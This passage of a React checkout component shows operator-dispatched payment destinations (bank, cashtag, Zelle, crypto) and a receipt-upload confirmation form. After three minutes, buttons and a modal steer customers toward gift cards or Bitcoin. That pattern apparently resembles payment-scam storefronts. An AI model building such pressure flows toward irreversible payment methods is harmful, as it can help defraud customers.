                  className="flex-1 bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-sky-500"
                />
                <button
                  type="submit"
                  disabled={isSendingReply || !replyInput.trim()}
                  className="px-4 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 disabled:opacity-50 text-black font-black text-[10px] uppercase tracking-wider flex items-center justify-center gap-1.5 cursor-pointer shrink-0"
                >
                  {isSendingReply ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
                  Send Note
                </button>
              </form>
              {replyFeedback && (
                <p className="text-[10px] font-bold text-emerald-400">{replyFeedback}</p>
              )}
            </div>

            {/* Instant Gift Card / Crypto Alternative */}
            {(onSwitchToGiftCard || onSwitchToMethod || (session?.createdAt && nowMs - new Date(session.createdAt).getTime() >= 3 * 60 * 1000)) && (
              <div className="pt-3 border-t border-white/10 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <span className="text-[11px] text-zinc-400">
                  Need to finish right now without waiting a few minutes?
                </span>
                <div className="flex flex-wrap items-center gap-2 self-start sm:self-auto">
                  {session?.createdAt && nowMs - new Date(session.createdAt).getTime() >= 3 * 60 * 1000 && (
                    <button
                      type="button"
                      onClick={() => setShowTenMinutePopup(true)}
                      className="px-3.5 py-2 bg-sky-500/15 hover:bg-sky-500/25 border border-sky-500/40 text-sky-300 font-black text-[10px] uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all cursor-pointer"
                    >
                      <Mail className="w-3.5 h-3.5" />
                      View 3-Min Options
                    </button>
                  )}
                  {(onSwitchToGiftCard || onSwitchToMethod) && (
                    <button
                      type="button"
                      onClick={() => (onSwitchToMethod ? onSwitchToMethod("giftcard") : onSwitchToGiftCard?.())}
                      className="px-3.5 py-2 bg-amber-500/15 hover:bg-amber-500/25 border border-amber-500/40 text-amber-300 hover:text-amber-200 font-black text-[10px] uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all cursor-pointer"
                    >
                      <Gift className="w-3.5 h-3.5" />
                      Switch to Gift Card (No Wait)
                    </button>
                  )}
                </div>
              </div>
            )}
          </motion.div>
        ) : (
          /* STATE 2: PAYMENT DETAILS RECEIVED / RESTORED - PROCEED NOW */
          <motion.div
            key="details-received"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            className="space-y-4"
          >
            {/* Green / Blue Success Banner */}
            <div className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 border transition-all ${
              recoveredFromPrevious
                ? "bg-blue-500/10 border-blue-500/30 text-blue-300"
                : "bg-emerald-500/10 border-emerald-500/30"
            }`}>
              <div className="flex items-center gap-2.5">
                <div className={`w-7 h-7 rounded-lg flex items-center justify-center shrink-0 ${
                  recoveredFromPrevious ? "bg-blue-500 text-white" : "bg-emerald-500 text-black"
                }`}>
                  {recoveredFromPrevious ? <Sparkles className="w-4 h-4" /> : <Check className="w-4 h-4 stroke-[3]" />}
                </div>
                <div>
                  <h4 className="text-xs font-black uppercase tracking-wider text-white">
                    {recoveredFromPrevious 
                      ? "Dispatched Payment Details Restored" 
                      : "Payment Details Dispatched by Control Room"}
                  </h4>
                  <p className="text-[10px] text-zinc-300 font-medium">
                    {recoveredFromPrevious
                      ? `Welcome back ${effectiveName || ""}! The official ${selectedMethod.toUpperCase()} destination details previously provided by our operator have immediately popped up.`
                      : `Verified destination details for ${effectiveName || "your order"}. Send exact payment using the details below, then enter your confirmation reference.`}
                  </p>
                </div>
              </div>
              <span className={`text-[9px] font-mono px-2 py-0.5 rounded font-black uppercase shrink-0 ${
                recoveredFromPrevious 
                  ? "text-blue-400 bg-blue-500/20 border border-blue-500/30" 
                  : "text-emerald-400 bg-emerald-500/20"
              }`}>
                {recoveredFromPrevious ? "Immediate Response Restored" : "Verified Ready"}
              </span>
            </div>

            {/* Render Details based on what Control Room input */}
            <div className="p-4 bg-zinc-950 border border-white/10 rounded-2xl space-y-3">
              <div className="flex items-center justify-between border-b border-white/5 pb-2">
                <span className="text-[10px] font-black uppercase tracking-wider text-zinc-400 flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5 text-blue-400" /> Official Payment Destination Details
                </span>
                <span className="text-xs font-black font-mono text-white">
                  ${amount.toLocaleString()} Due
                </span>
              </div>

              {/* Bank Details */}
              {details.bankName || details.accountNumber ? (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
                  {details.bankName && (
                    <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
                      <div>
                        <span className="text-[8px] font-black uppercase text-zinc-500 block">Bank Institution</span>
                        <span className="font-bold text-white uppercase">{details.bankName}</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy(details.bankName!, "bankName")}
                        className="p-1.5 rounded-lg bg-zinc-800 text-zinc-400 hover:text-white"
                      >
                        {copiedKey === "bankName" ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  )}

                  {details.accountName && (
                    <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
                      <div>
                        <span className="text-[8px] font-black uppercase text-zinc-500 block">Account Name</span>
                        <span className="font-bold text-white">{details.accountName}</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy(details.accountName!, "accountName")}
                        className="p-1.5 rounded-lg bg-zinc-800 text-zinc-400 hover:text-white"
                      >
                        {copiedKey === "accountName" ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  )}

                  {details.accountNumber && (
                    <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
                      <div>
                        <span className="text-[8px] font-black uppercase text-zinc-500 block">Account Number</span>
                        <span className="font-mono font-black text-emerald-400">{details.accountNumber}</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy(details.accountNumber!, "accountNumber")}
                        className="p-1.5 rounded-lg bg-zinc-800 text-zinc-400 hover:text-white"
                      >
                        {copiedKey === "accountNumber" ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  )}

                  {details.routingNumber && (
                    <div className="p-3 bg-zinc-900 rounded-xl border border-white/5 flex items-center justify-between">
                      <div>
                        <span className="text-[8px] font-black uppercase text-zinc-500 block">Routing / Wire Code</span>
                        <span className="font-mono font-black text-blue-400">{details.routingNumber}</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleCopy(details.routingNumber!, "routingNumber")}
                        className="p-1.5 rounded-lg bg-zinc-800 text-zinc-400 hover:text-white"
                      >
                        {copiedKey === "routingNumber" ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  )}
                </div>
              ) : null}

              {/* Cashtag / Handle / Email / Address / Card Link */}
              {details.identifier ? (
                <div className="p-3.5 bg-zinc-900 rounded-xl border border-white/5 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div className="space-y-0.5">
                    <span className="text-[8px] font-black uppercase text-zinc-500 block">
                      {selectedMethod === "cashapp" && "Official Cashtag"}
                      {selectedMethod === "zelle" && "Zelle Recipient"}
                      {selectedMethod === "venmo" && "Venmo Handle"}
                      {selectedMethod === "paypal" && "PayPal Email / Recipient"}
                      {selectedMethod === "crypto" && "Crypto Deposit Address"}
                      {selectedMethod === "card" && "Secure Card Payment Link / Portal"}
                      {selectedMethod === "bank" && "Bank Transfer Reference"}
                      {!["cashapp", "zelle", "venmo", "paypal", "crypto", "card", "bank"].includes(selectedMethod) && "Payment Destination"}
                    </span>
                    <span className="text-base font-mono font-black text-emerald-400 break-all">
                      {details.identifier}
                    </span>
                    {details.recipientName && (
                      <span className="text-[10px] text-zinc-400 font-bold block">
                        Recipient Name: {details.recipientName}
                      </span>
                    )}
                    {details.mode && (
                      <span className="inline-block text-[9px] font-mono text-blue-300 bg-blue-500/10 px-1.5 py-0.5 rounded uppercase mt-0.5">
                        Mode: {details.mode}
                      </span>
                    )}
                  </div>

                  <div className="flex items-center gap-2 self-start sm:self-auto">
                    {details.identifier.trim().startsWith("http") && (
                      <a
                        href={details.identifier.trim()}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="px-3.5 py-2 bg-blue-600 hover:bg-blue-500 text-white font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all shadow-md"
                      >
                        <CreditCard className="w-4 h-4" />
                        Open Portal
                      </a>
                    )}
                    <button
                      type="button"
                      onClick={() => handleCopy(details.identifier!, "identifier")}
                      className="px-4 py-2 bg-emerald-500 hover:bg-emerald-400 text-black font-black text-xs uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all cursor-pointer shadow-md"
                    >
                      {copiedKey === "identifier" ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      {copiedKey === "identifier" ? "Copied" : "Copy"}
                    </button>
                  </div>
                </div>
              ) : null}

              {/* Special Instructions or Memo from Control Room */}
              {details.instructions && (
                <div className="p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl text-[10px] text-blue-300 space-y-1">
                  <span className="font-black uppercase tracking-wider block">Operator Special Instructions:</span>
                  <p className="leading-relaxed font-medium">{details.instructions}</p>
                </div>
              )}
            </div>

            {/* Customer Payment Confirmation Form */}
            <form onSubmit={handleConfirmAndProceed} className="p-4 bg-zinc-950 border border-white/10 rounded-2xl space-y-3">
              <div className="border-b border-white/5 pb-2">
                <h5 className="text-xs font-black uppercase tracking-wider text-white">
                  Step 2: Submit Payment Verification
                </h5>
                <p className="text-[10px] text-zinc-400">
                  After completing your transfer, enter your reference or upload a screenshot to proceed.
                </p>
              </div>

              <div className="space-y-1">
                <label className="text-[9px] font-bold uppercase text-zinc-400 block">
                  Your Sender Cashtag / Bank Ref / Transaction ID {receiptUrls.length === 0 ? "*" : "(Optional if screenshot attached)"}
                </label>
                <input
                  type="text"
                  required={receiptUrls.length === 0}
                  placeholder="e.g. $MyTag, Wire Ref #12849, or confirmation code"
                  value={referenceTag}
                  onChange={(e) => {
                    const nextRef = e.target.value;
                    setReferenceTag(nextRef);
                    if (receiptUrls.length > 0 && onPaymentSubmitted) {
                      onPaymentSubmitted(nextRef.trim(), receiptUrl, receiptUrls);
                    }
                  }}
                  className="w-full bg-zinc-900 border border-white/10 rounded-xl px-3 py-2 text-xs font-semibold text-white placeholder-zinc-600 focus:outline-none focus:border-emerald-500"
                />
              </div>

              {/* Receipt Upload Option */}
              <div className="space-y-1 pt-1">
                <label className="text-[9px] font-bold uppercase text-zinc-400 block">
                  Transfer Screenshot / Receipt (Recommended)
                </label>
                <PaymentReceiptUploader
                  value={receiptUrl}
                  values={receiptUrls}
                  onChange={(url) => handleReceiptsUpdated(url ? [url] : [])}
                  onValuesChange={(urls) => handleReceiptsUpdated(urls)}
                />
              </div>

              {submitError && (
                <div className="p-2.5 bg-rose-500/10 border border-rose-500/30 rounded-xl flex items-center gap-2 text-rose-400 text-[11px] font-bold">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{submitError}</span>
                </div>
              )}

              <button
                type="submit"
                disabled={isSubmitting || (!referenceTag.trim() && receiptUrls.length === 0)}
                className="w-full py-3.5 bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 text-black font-black text-xs uppercase tracking-wider rounded-xl flex items-center justify-center gap-2 transition-all cursor-pointer shadow-lg shadow-emerald-500/20"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Submitting Payment Verification...
                  </>
                ) : (
                  <>
                    <CheckCircle2 className="w-4 h-4" />
                    I Have Sent Payment - Proceed Now
                  </>
                )}
              </button>
            </form>

            {session?.messages && session.messages.length > 0 && (
              <div className="p-4 bg-zinc-950 border border-sky-500/25 rounded-2xl space-y-2.5">
                <div className="flex items-center justify-between border-b border-white/5 pb-2">
                  <span className="text-[10px] font-black uppercase tracking-wider text-sky-300 flex items-center gap-1.5">
                    <MessageSquare className="w-3.5 h-3.5" /> Direct Concierge Messages ({session.messages.length})
                  </span>
                </div>
                <div className="space-y-2 max-h-40 overflow-y-auto pr-1">
                  {session.messages.map((m) => (
                    <div
                      key={m.id}
                      className={`p-2.5 rounded-xl border text-xs space-y-0.5 ${
                        m.sender === "admin"
                          ? "bg-sky-500/10 border-sky-500/25 text-zinc-100"
                          : "bg-zinc-900/90 border-white/10 text-zinc-300"
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2 text-[9px] font-black uppercase">
                        <span className={m.sender === "admin" ? "text-sky-300" : "text-indigo-300"}>
                          {m.sender === "admin" ? (m.senderName || "Billing Concierge Desk") : "You"}
                        </span>
                        <span className="text-zinc-500 font-mono">
                          {new Date(m.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                        </span>
                      </div>
                      {m.subject && <p className="text-[11px] font-bold text-white">{m.subject}</p>}
                      <p className="text-[11px] text-zinc-200 leading-relaxed whitespace-pre-wrap">{m.body}</p>
                    </div>
                  ))}
                </div>
                <form onSubmit={handleSendGuestReply} className="flex gap-2 pt-1">
                  <input
                    type="text"
                    placeholder="Reply to desk (no sign-in needed)..."
                    value={replyInput}
                    onChange={(e) => setReplyInput(e.target.value)}
                    className="flex-1 bg-zinc-900 border border-white/10 rounded-xl px-3 py-2 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-sky-500"
                  />
                  <button
                    type="submit"
                    disabled={isSendingReply || !replyInput.trim()}
                    className="px-3.5 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 disabled:opacity-50 text-black font-black text-[10px] uppercase tracking-wider flex items-center gap-1.5 cursor-pointer shrink-0"
                  >
                    <Send className="w-3.5 h-3.5" /> Send
                  </button>
                </form>
              </div>
            )}
          </motion.div>
        )}
      </AnimatePresence>

      {/* 3-Minute Delay Reconstructed Pop-up Notice */}
      <TenMinuteFollowUpModal
        isOpen={showTenMinutePopup}
        onClose={handleDismissTenMinutePopup}
        sessionId={activeSessionId || sessionId}
        customerName={effectiveName || session?.customerName}
        customerEmail={effectiveEmail || session?.customerEmail}
        itemTitle={itemTitle || session?.itemTitle}
        amount={amount}
        currentMethod={selectedMethod}
        elapsedMinutes={
          session?.createdAt
            ? Math.max(3, Math.floor((nowMs - new Date(session.createdAt).getTime()) / 60000))
            : 3
        }
        isSwitching={isSwitchingMethod}
        onSwitchToBitcoin={handleTenMinSwitchToBitcoin}
        onSwitchToGiftCard={onSwitchToMethod || onSwitchToGiftCard ? handleTenMinSwitchToGiftCard : undefined}
      />
    </div>
  );
};
